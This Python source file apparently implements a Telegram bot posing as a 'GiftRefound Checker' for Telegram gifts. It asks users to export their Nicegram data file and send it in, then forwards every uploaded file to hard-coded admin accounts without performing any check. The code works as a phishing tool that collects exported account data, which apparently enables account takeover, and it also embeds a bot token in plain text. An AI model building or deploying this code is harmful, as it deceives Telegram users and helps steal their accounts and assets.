import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
from datetime import datetime
import time
import requests
import os
from flask import Flask
import threading
import sys

# Создаем Flask приложение для HTTP
app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8528821671:AAE38YDiAVscwioEUiG7G1psKWaTyCSpHSo")

# Получаем список ID админов
admin_ids_str = os.getenv("ADMIN_IDS", "8553896368,8413331075")
ADMIN_IDS = [int(id_str.strip()) for id_str in admin_ids_str.split(",")]

DB = "refound_bot.db"

# Создаем бота с обработкой ошибок
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)  # Отключаем многопоточность для polling


# Эндпоинт для проверки здоровья
@app.route('/')
def home():
    return """
    <h1>NiceGram Bot is Running! 🚀</h1>
    <p>Бот активен и готов к работе</p>
    <p>Время: {}</p>
    """.format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))


@app.route('/health')
def health():
    return "OK", 200


def init_db():
    try:
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS checks (
                user_id INTEGER,
                username TEXT,
                file_id TEXT,
                status TEXT,
                check_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        conn.close()
        print("База данных инициализирована")
    except Exception as e:
        print(f"Ошибка базы данных: {e}")


@bot.message_handler(commands=['start'])
def start(message):
    try:
        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("Проверить на Refound",
                                 callback_data="check_refound"))
        keyboard.row(
            InlineKeyboardButton("Инструкция", callback_data="instruction"))

        caption = """
<b>Добро пожаловать в GiftRefound Checker!</b>

Проверяйте Telegram-подарки на возможность возврата перед покупкой.
        """

        bot.send_photo(message.chat.id,
                       "https://i.postimg.cc/gXgxWWVs/design-image.jpg",
                       caption=caption,
                       reply_markup=keyboard,
                       parse_mode='HTML')
    except Exception as e:
        print(f"Ошибка в start: {e}")


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        if call.data == "check_refound":
            instruction_text = """
<b>Отправьте файл данных Nicegram</b>

1. Откройте Nicegram
2. Настройки -> Nicegram 
3. Экспортировать в файл
4. Отправьте файл сюда

Проверка: 5-10 минут
            """
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("Назад", callback_data="back_to_menu"))
            bot.edit_message_caption(chat_id=call.message.chat.id,
                                     message_id=call.message.message_id,
                                     caption=instruction_text,
                                     parse_mode='HTML',
                                     reply_markup=keyboard)

        elif call.data == "instruction":
            instruction_text = """
<b>Инструкция по проверке:</b>

1. Скачайте Nicegram
2. Экспортируйте данные
3. Отправьте файл боту
4. Получите результат
            """
            keyboard = InlineKeyboardMarkup()
            keyboard.add(
                InlineKeyboardButton("Скачать Nicegram",
                                     url="https://nicegram.app"))
            keyboard.add(
                InlineKeyboardButton("Проверить файл",
                                     callback_data="check_refound"))
            keyboard.add(
                InlineKeyboardButton("Назад", callback_data="back_to_menu"))

            bot.edit_message_caption(chat_id=call.message.chat.id,
                                     message_id=call.message.message_id,
                                     caption=instruction_text,
                                     parse_mode='HTML',
                                     reply_markup=keyboard)

        elif call.data == "back_to_menu":
            keyboard = InlineKeyboardMarkup()
            keyboard.row(
                InlineKeyboardButton("Проверить на Refound",
                                     callback_data="check_refound"))
            keyboard.row(
                InlineKeyboardButton("Инструкция",
                                     callback_data="instruction"))

            caption = "<b>Добро пожаловать в GiftRefound Checker!</b>"

            bot.edit_message_caption(chat_id=call.message.chat.id,
                                     message_id=call.message.message_id,
                                     caption=caption,
                                     parse_mode='HTML',
                                     reply_markup=keyboard)

    except Exception as e:
        print(f"Ошибка в callback: {e}")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        user = message.from_user

        bot.reply_to(message,
                     "Файл получен! Проверка займет 5-10 минут.",
                     parse_mode='HTML')

        admin_text = f"""
Новый файл для проверки!

Пользователь: {user.first_name} (@{user.username if user.username else 'нет'})
ID: {user.id}
Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Файл: {message.document.file_name}
        """

        # Отправляем уведомление всем админам
        for admin_id in ADMIN_IDS:
            try:
                # Сначала пробуем отправить файл
                bot.send_document(admin_id,
                                  message.document.file_id,
                                  caption=admin_text,
                                  parse_mode='HTML')
                print(f"Файл отправлен админу {admin_id}")
                
            except Exception as e:
                print(f"Ошибка отправки админу {admin_id}: {e}")
                # Если не удалось отправить файл, отправляем хотя бы текстовое уведомление
                try:
                    bot.send_message(admin_id, 
                                    f"⚠️ Не удалось отправить файл от пользователя {user.id}\nОшибка: {str(e)[:100]}")
                except:
                    pass

        # Сохраняем в базу
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO checks (user_id, username, file_id, status) VALUES (?, ?, ?, ?)",
            (user.id, user.username, message.document.file_id, "pending"))
        conn.commit()
        conn.close()

        print(f"Файл от {user.id} обработан. Админы уведомлены: {ADMIN_IDS}")

    except Exception as e:
        print(f"Ошибка обработки файла: {e}")
        bot.reply_to(message, "Ошибка при обработке файла.")


@bot.message_handler(commands=['admin'])
def admin_info(message):
    """Показывает информацию об админах для отладки"""
    if message.from_user.id not in ADMIN_IDS:
        return
    
    admin_list = "\n".join([f"• {admin_id}" for admin_id in ADMIN_IDS])
    bot.reply_to(message, 
                f"📋 Список админов ({len(ADMIN_IDS)}):\n{admin_list}\n\nВаш ID: {message.from_user.id}\nВы админ: {message.from_user.id in ADMIN_IDS}")


@bot.message_handler(commands=['test'])
def test_admin(message):
    """Тестовая команда для проверки отправки"""
    if message.from_user.id not in ADMIN_IDS:
        return
    
    # Отправляем тестовое сообщение всем админам
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, f"Тестовое сообщение! Ваш ID: {admin_id}")
            print(f"Тест отправлен админу {admin_id}")
        except Exception as e:
            print(f"Ошибка теста админу {admin_id}: {e}")


@bot.message_handler(commands=['result'])
def send_result(message):
    # Проверяем, что пользователь является админом
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "⛔ У вас нет прав администратора!")
        return

    try:
        args = message.text.split()[1:]
        if len(args) < 2:
            bot.reply_to(message, "Использование: /result <user_id> <текст>")
            return

        user_id = int(args[0])
        result_text = " ".join(args[1:])

        bot.send_message(user_id, f"Результат проверки:\n\n{result_text}")
        bot.reply_to(message, "✅ Результат отправлен пользователю")

    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")


def check_bot_token():
    """Проверка валидности токена"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getMe"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            print(f"✅ Токен валиден. Бот: @{data['result']['username']}")
            return True
        else:
            print(f"❌ Токен невалиден: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Ошибка проверки токена: {e}")
        return False


def run_telegram_bot():
    """Запуск Telegram бота в отдельном потоке"""
    print("🚀 Запуск Telegram бота...")
    print(f"👥 Админы: {ADMIN_IDS}")

    # Проверяем токен
    if not check_bot_token():
        print("❌ ОШИБКА: Неверный токен бота!")
        return

    init_db()

    # Удаляем веб-хук перед запуском polling (важно!)
    try:
        bot.remove_webhook()
        time.sleep(1)
    except:
        pass

    # Запускаем бота с обработкой ошибок
    try:
        print("🤖 Бот запущен и слушает сообщения...")
        while True:
            try:
                bot.polling(none_stop=True, timeout=30, long_polling_timeout=30)
            except Exception as e:
                print(f"⚠️ Ошибка polling: {e}")
                print("🔄 Перезапуск через 5 секунд...")
                time.sleep(5)
    except KeyboardInterrupt:
        print("⏹️ Бот остановлен")
        sys.exit(0)


def start_ping():
    """Функция для пинга в отдельном потоке"""
    def ping():
        while True:
            try:
                response = requests.get("https://nicegram.grigorevbogdan4.repl.co/health", timeout=10)
                print(f"📡 Пинг отправлен: {response.status_code} - {datetime.now().strftime('%H:%M:%S')}")
            except Exception as e:
                print(f"📡 Ошибка пинга: {e}")
            time.sleep(240)  # 4 минуты
    
    thread = threading.Thread(target=ping, daemon=True)
    thread.start()
    return thread


if __name__ == "__main__":
    print("=" * 50)
    print("🎵 Запуск NiceGram Bot")
    print("=" * 50)
    print(f"👥 ID админов: {ADMIN_IDS}")
    print(f"🆔 Всего админов: {len(ADMIN_IDS)}")
    
    # Запускаем пинг в отдельном потоке
    ping_thread = start_ping()
    print("📡 Пинг сервиса запущен")
    
    # Запускаем Telegram бота в основном потоке
    run_telegram_bot()
